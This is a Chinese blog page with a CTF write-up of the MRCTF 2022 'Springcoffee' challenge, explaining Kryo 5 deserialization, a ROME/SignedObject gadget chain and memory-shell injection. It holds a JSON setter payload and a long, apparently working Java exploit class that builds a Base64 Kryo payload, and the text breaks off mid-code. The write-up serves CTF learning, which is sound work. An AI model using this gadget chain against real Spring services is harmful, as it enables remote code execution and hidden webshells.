@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            MRCTF22 Springcoffee |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        MRCTF22 Springcoffee
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-09 19:28:38</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri May 09 2025 19:29:12 GMT+0800">2025-05-09 19:29:12</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/CTF-Java/">CTF-Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF-Java-Java/">CTF-Java, Java</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.6k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>18 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>高版本kyro反序列化，二次反序列化绕transit属性，controller内存马注入，rasp绕过（forkAndExec绕过）</p>
+<p>这题考的东西很多，而且很复杂，当时复现花了两天才搞好，不过也是学到了很多东西</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>组件自己看吧，很容易确定是kyro入口。依赖里也用rometools，那么就可以考虑ROME链，也就是toString–&gt;getter。rasp是注入内存马读文件后才发现的，后面在分析</p>
+<h2 id="高版本kryo绕过"><a href="#高版本kryo绕过" class="headerlink" title="高版本kryo绕过"></a>高版本kryo绕过</h2><p>这里kyro是5.3.0版本的，之前在ciscn23里考过一道seaclouds，那里面的kryo是4.x.x版本的。这两个版本有一些不同，下面分析。</p>
+<p>kyro跟hessian一样，都是基于field机制的。一般入口点可以是HashMap#hashcode，因为里面反序列化HashMap类型数据的时候会调用put还原，而put的时候一定会用hashcode检查键是否重复。另外，也可以从equals入手，那就可以走HotSwap那条，最终也是可以触发toString</p>
+<p>不过kryo4直接序列化就行，kryo5里面却加了一些限制。下面参照Y4的文章<a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/" >2022MRCTF-Java部分<i class="fas fa-external-link-alt"></i></a>，开始分析</p>
+<p>首先这里链子是比较简单的，要注意的就是需要有二次反序列化，因为kyro不能序列化transit的属性，而TemplatesImpl的_tfactory就是transit属性。</p>
+<p>大致链子如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HashMap#putVal#equals</span><br><span class="line">HotSwappableTargetSource#equals</span><br><span class="line">XString#equals</span><br><span class="line">ToStringBean#toString</span><br><span class="line">SignedObject#getObject</span><br><span class="line">HashMap#readObject</span><br><span class="line">HashMap#hash</span><br><span class="line">EqualsBean#hashCode</span><br><span class="line">ToStringBean#toString</span><br><span class="line">TemplateImpl#getter</span><br></pre></td></tr></table></figure>
+
+<p>当然，前半段用ROME链触发也可以。</p>
+<p>先不放阶段性EXP了，强烈建议先去后面看完整的，把讲到的部分看了就行，后面也是这样。这里如果构造好EXP去测试的话是会报错的：<img   src="/2025/05/03/JNI/F22-Springcoffee/c41f86048c45036d12aa7958ed47f19.png"  alt="img"></p>
+<p>说是HashMap的Class没注册。这里我们回去看一下Controller里的逻辑是怎么写的：<img   src="/2025/05/03/JNI/F22-Springcoffee/8957fe73b9889b897fb84644298f707.png"  alt="img"></p>
+<p><img   src="/2025/05/03/JNI/F22-Springcoffee/8d4aaa4eae3f1cbe63f12fa2c3096d5.png"  alt="img"></p>
+<p>两个路由，第一个很明显是反序列化的，那第二个是用来干什么的呢？简单分析可以知道，它是用来调用kryo里的任意setter方法的。解决报错的关键就在于调用什么setter方法，传入什么参数。我们知道，kryo反序列化的关键就是调用com.esotericsoftware.kryo.serializers.MapSerializer进行反序列化。</p>
+<p>知道上面这些后，我们再去定位到报错的位置：<img   src="/2025/05/03/JNI/F22-Springcoffee/679d5738e5de813a8a3f56dedd26474.png"  alt="img"></p>
+<p>报错在这里，那我们调整这个值为false是不是就可以了呢？正好又有对应的set方法，去尝试一下，发现确实可以。此时它会执行com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit&#x3D;&gt;com.esotericsoftware.kryo.Kryo#getDefaultSerializer最终获取到我们需要的com.esotericsoftware.kryo.serializers.MapSerializer</p>
+<p>不过出现了新的报错：意思是反序列化的类需要有无参构造<img   src="/2025/05/03/JNI/F22-Springcoffee/fb801973ddb6b4e50319dba322f405a.png"  alt="img"></p>
+<p>这个报错怎么解决我不太能讲清楚，这里直接给</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;InstantiatorStrategy&quot;</span>: <span class="string">&quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以去看Y4的文章，写的比较清楚</p>
+<p>最终的payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;polish&quot;</span><span class="punctuation">:</span> True<span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;References&quot;</span><span class="punctuation">:</span> True<span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;RegistrationRequired&quot;</span><span class="punctuation">:</span> False<span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;InstantiatorStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里还多出来一个References，这个很多文章里没写，但是必须要加，我从官方EXP里面看到的。但是具体原因不知道，如果有人知道了可以给我留言。</p>
+<p>kryo反序列化到此为止，EXP：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.compiler.Template;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> fun.mrctf.springcoffee.model.ExtraFlavor;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> tools.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KryoSer</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ser</span><span class="params">(String raw)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">serializeConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo = <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">            <span class="keyword">for</span> (Method setMethod : <span class="built_in">this</span>.kryo.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                setMethod.invoke(<span class="built_in">this</span>.kryo, Class.forName((String) p1).newInstance());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="built_in">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1diOt9&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BaiduSyncdisk\\ctf-challenges\\java-challenges\\MRCTF\\MRCTF2022\\springcoffee\\target\\classes\\memshell\\SpringBootController_Higher2_6_0.class&quot;</span>));</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="comment">//防止在put时触发</span></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(equalsBean1, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(equalsBean1, <span class="string">&quot;obj&quot;</span>, toStringBean1);</span><br><span class="line">        setFieldValue(equalsBean1, <span class="string">&quot;beanClass&quot;</span>, ToStringBean.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//固定写法，初始化SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap1,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        signedObject.getObject();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean2);</span><br><span class="line">        <span class="comment">// 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(h1, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        hashMap2.put(h2, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射设置 this.target 为 XString 对象</span></span><br><span class="line">        setFieldValue(h2, <span class="string">&quot;target&quot;</span>, <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;test&quot;</span>));</span><br><span class="line">        setFieldValue(toStringBean2, <span class="string">&quot;obj&quot;</span>, signedObject);</span><br><span class="line">        setFieldValue(toStringBean2, <span class="string">&quot;beanClass&quot;</span>, SignedObject.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(baos);</span><br><span class="line">        <span class="built_in">this</span>.kryo.writeClassAndObject(output, hashMap2);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deser</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s));</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(bais);</span><br><span class="line">        <span class="built_in">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KryoSer</span> <span class="variable">kryoSer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KryoSer</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">raw</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;polish\&quot;:true,\&quot;References\&quot;: True,\&quot;RegistrationRequired\&quot;:false,\&quot;InstantiatorStrategy\&quot;: \&quot;org.objenesis.strategy.StdInstantiatorStrategy\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ser</span> <span class="operator">=</span> kryoSer.ser(raw);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\tmp\\payload.txt&quot;</span>).write(ser.getBytes());</span><br><span class="line"><span class="comment">//        kryoSer.deser(ser);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = obj.getClass();</span><br><span 